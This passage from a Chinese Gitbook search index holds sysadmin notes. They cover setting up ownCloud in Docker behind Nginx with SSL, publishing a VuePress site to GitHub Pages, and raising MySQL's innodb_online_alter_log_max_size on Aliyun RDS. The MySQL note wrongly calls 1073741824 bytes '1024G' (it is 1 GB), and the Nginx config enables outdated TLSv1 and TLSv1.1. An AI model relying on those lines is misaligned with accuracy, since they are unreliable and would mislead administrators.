WAMP、XAMPP 等工具搭建简单的运行环境。另外，ownCloud 还提供了搭建好环境的虚拟机文件，你可以直接在 VMWare、VirtualBox、Hyper-V 中运行 ownCloud 服务器端。 本文需要 1.域名（非必须） 2.服务器笔者使用腾讯云（1核+2G+100G+5M）土豪可以购买更大的配置。内网使用VMware虚拟机搭建也是可以的。 3.系统：Centos7 使用到的技术 Linux（基于Centos7） Docker（或者LNMP，本文将数据库），Nginx+SSL等 基于docker安装ownCloud 1.安装docker（省略） 拉取镜像、运行 # docker pull owncloud # docker images REPOSITORY TAG IMAGE ID CREATED SIZE docker.io/owncloud latest 327bd201c5fb 2 years ago 618 MB # docker run -itd --name owncloud --restart always -p 83:80 -v /data/wwwroot/web/o.xgss.net:/var/www/html/data -d owncloud 使用IP+端口的方式访问，不点安装 ownCloud文件则是原封不动地将文件保存在服务器硬盘，目录结构也跟网页版 (客户端) 上看到的一样，只要别人有权限访问你的主机，那么就能绕过 ownCloud 直接查看或拷走所有用户的文件了。不过，ownCloud 这种方式也有它的优点，就是当有一天你不再想用 ownCloud，或者它因各种原因挂掉了，你的文件的备份和导出都非常方便！ ownCloud 主机服务器端还支持将文件上传到公有云服务，如 Amazon S3、Dropbox、FTP、Google Drive、OpenStack Object Storage、SMB、WebDAV、SFTP 等远程服务器，所以更加灵活。 2.域名解析 将 o.xgss.net 域名解析到服务器中 123.123.123.xxx 3.申请免费SSL证书 如果不使用https则此步骤可省略 我这边申请免费的阿里云的一年免费证书。 填写域名和基本信息 选择最简单的DNS验证 下载nxing证书 4.配置nginx 安装NGINX（省略） http的配置 ########################o.xgss.net############################################ upstream ownCloud_server{ server 127.0.0.1:83; } server { listen 80; server_name o.xgss.net; access_log /data/wwwroot/log/o.xgss.net.log main_zdy; error_log off; proxy_set_header X-Forwarded-For $remote_addr; location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; add_header Cache-Control \"no-cache\"; proxy_pass http://ownCloud_server; limit_rate 256m; # 用户下载限速 client_max_body_size 0; # 允许上传的文件大小无限制 #client_max_body_size 5G; # 允许上传的文件5G } } https的配置 upstream ownCloud_server{ server 127.0.0.1:83; } # http 跳转 https server { listen 80; access_log off; error_log off; server_name o.xgss.net; return 301 https://$host$request_uri; } server { listen 443 ssl; server_name o.xgss.net; access_log /data/wwwroot/log/o.xgss.net_ssl.log main_aliyun; error_log off; ssl_certificate /data/wwwroot/web/cert/o.xgss.net.pem; ssl_certificate_key /data/wwwroot/web/cert/o.xgss.net.key; ssl_session_timeout 5m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4; ssl_prefer_server_ciphers on; proxy_set_header X-Forwarded-For $remote_addr; location / { proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; add_header Cache-Control \"no-cache\"; proxy_pass http://ownCloud_server; limit_rate 256m; # 用户下载限速 client_max_body_size 0; # 允许上传的文件大小无限制 #client_max_body_size 5G; # 允许上传的文件5G } } 浏览器访问安装 默认使用SQLlite即可，如果有mysql的则可填写mysql的配置 下载客户端 客户端配置 ownCloud私有云盘搭建安装完成，支持跨平台支持 Windows、Mac、Android、iOS、Linux 等。以下介绍几个最常见的客户端的安装方法。 Windows客户端 官网下载： https://owncloud.com/desktop-app/ IOS客户端 App Store上搜索 owncloud即可安装 Android客户端 官网下载https://owncloud.com/mobile-apps/ 华为应用商店搜索 owncloud即可安装 MAC客户端 官网下载： https://owncloud.com/desktop-app/ WebDAV连接（windows客户端） 下载软件 RAiDrive Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/blog/":{"url":"doc/blog/","title":"博客系统","keywords":"","body":"博客系统 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-14 16:30:42 "},"doc/blog/基于VuePress和github搭建无服务器博客、文档系统.html":{"url":"doc/blog/基于VuePress和github搭建无服务器博客、文档系统.html","title":"基于VuePress和github搭建无服务器博客、文档系统","keywords":"","body":"基于VuePress和github用搭建无服务器的博客、文档系统 最近想做一个项目介绍自己的一些项目和日常的文档，让文档有个属于自己的家，https://g.xgss.net 使用gitbook之后，又看到了vuepress，感觉还是挺好用的。 既可以当做博客系统、文档系统，项目介绍的系统，还有丰富的插件使用。 要用到的域名： http://vuepress.xgss.net (github pages)的域名。 github地址： https://github.com/funet8/vuepress.xgss.net.git 什么是VuePress VuePress 由两部分组成：第一部分是一个极简静态网站生成器 (opens new window)，它包含由 Vue 驱动的主题系统和插件 API，另一个部分是为书写技术文档而优化的默认主题，它的诞生初衷是为了支持 Vue 及其子项目的文档需求。 简单的说它就是一个快速建设文档站点的工具，在简单配置好功能后，需要做的事情就剩下写好一个个 Markdown 文档，并且可以将其发布到github pages中 vuepress官网：https://vuepress.vuejs.org/zh/ 一、安装nodejs和yarn 笔者是windows11系统,打开官网:http://nodejs.cn/download/ 我这里下载的是 node-v16.14.0-x64.msi，跟安装普通的软件一样。 安装之后。 Administrator@star-win11 MINGW64 /e/360data/重要数据/桌面 $ node -v v16.14.0 安装yarn $ npm i yarn -g 二、新建github仓库 进入github创建仓库，你也可以fork我的仓库。 三、克隆项目 地址改成自己的 # git clone git@github.com:funet8/vuepress.xgss.net.git 或者 # git clone https://github.com/funet8/vuepress.xgss.net.git # 进入项目 cd vuepress.xgss.net # yarn init # npm init # yarn add -D vuepress # npm install -D vuepress 弹出如下信息： yarn add v1.22.17 info No lockfile found. [1/4] Resolving packages... warning @vuepress/theme-blog > @vuepress/plugin-pwa > workbox-build > @hapi/joi@15.1.1: Switch to 'npm install joi' ... └─ zepto@1.2.0 Done in 113.09s. 四、在本地启动服务器 # yarn docs:dev # npm run docs:dev 当出现以下可以在浏览器中访问本机IP+端口访问 > VuePress dev server listening at http://localhost:8099/ 五、浏览器访问 访问： http://localhost:8080/ 根据IP（替换本机IP）：http://192.168.1.XXX:8080/ 关于图片 VuePress 遵循 “约定优于配置” 的原则，按照官网设置目录结构 在md中加入静态图片的问题，在md文件中可以使用下面的方式应用静态图片，下面imgs文件夹在public文件件下 目录如下 文件地址： docs/.vuepress/public/images/logo.png md文档中： ![image](/images/logo.png) 六、项目上线到github pages 参考文章： https://g.xgss.net/doc/gitbook/Github-Page-my-domain.html 在项目中新建文件 CNAME echo 'vuepress.xgss.net'> CNAME github中，setting--->pages 域名解析 vuepress.xgss.net域名CNAME解析到 funet8.github.io 访问： http://vuepress.xgss.net 关于自动打包更新 打包脚本，每次项目文档更新之后运行脚本即可 cat deploy.sh #!/usr/bin/env sh # 确保脚本抛出遇到的错误 set -e #提交到github参考 git init git add -A git commit -m 'deploy' git push -f git@github.com:funet8/vuepress.xgss.net.git master # 生成静态文件 yarn docs:build # 进入生成的文件夹 cd docs/.vuepress/dist git init git remote add origin git@github.com:funet8/vuepress.xgss.net.git git add . git commit -m \"脚本自动提交\" git branch -M master git push --force --quiet \"git@github.com:funet8/vuepress.xgss.net.git\" master:gh-pages cd - 关于主题和插件 修改配置文件： docs\\.vuepress\\config.js 添加主题： theme: 'vuepress-theme-note', Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-14 23:37:30 "},"doc/debug/":{"url":"doc/debug/","title":"调试Debug","keywords":"","body":"调试 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-14 11:29:55 "},"doc/debug/innodb_online_alter_log_max_size.html":{"url":"doc/debug/innodb_online_alter_log_max_size.html","title":"Mysql数据库在释放一个数亿记录的表报错","keywords":"","body":"在释放一个数亿记录的表时报该错 阿里云RDS删除数据库过期报错： ... error Creating index 'PRIMARY' required more than 'innodb_online_alter_log_max_size' bytes of modification log. Please try again. optimize status Operation failed 网上搜索问题 https://blog.csdn.net/hyzx_9987/article/details/112010324 在释放一个数亿记录的表时报该错 Creating index 'PRIMARY' required more than 'innodb_online_alter_log_max_size' bytes of modification 最大的在线创建索引修改日志文件大小 大致意思就是，当online_alter的时候，会将insert,update,delete的数据存在log中，log有个上限就是这个参数；如果alter花费了1小时，而在这1小时内的数据变更超过500M，那么就会失败； 解决方案 set global innodb_online_alter_log_max_size = 10737418240，调大该值； mysql> show variables like '%innodb_online_alter_log_max_size%'; +----------------------------------+-----------+ | Variable_name | Value | +----------------------------------+-----------+ | innodb_online_alter_log_max_size | 134217728 | +----------------------------------+-----------+ 1 row in set 默认大小为128M set global innodb_online_alter_log_max_size=1073741824; 设置为1024G 在阿里云RDS中用命令行修改 无权限 mysql> set global innodb_online_alter_log_max_size=1073741824; 1227 - Access denied; you need (at least one of) the SUPER privilege(s) for this operation 阿里云后台的'参数设置'修改提交，之后即可生效（非重启数据库）。 修成功 mysql> show variables like '%innodb_online_alter_log_max_size%'; +----------------------------------+------------+ | Variable_name | Value | +----------------------------------+------------+ | innodb_online_alter_log_max_size | 1073741824 | +----------------------------------+------------+ 1 row in set Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-14 11:22:30 "}}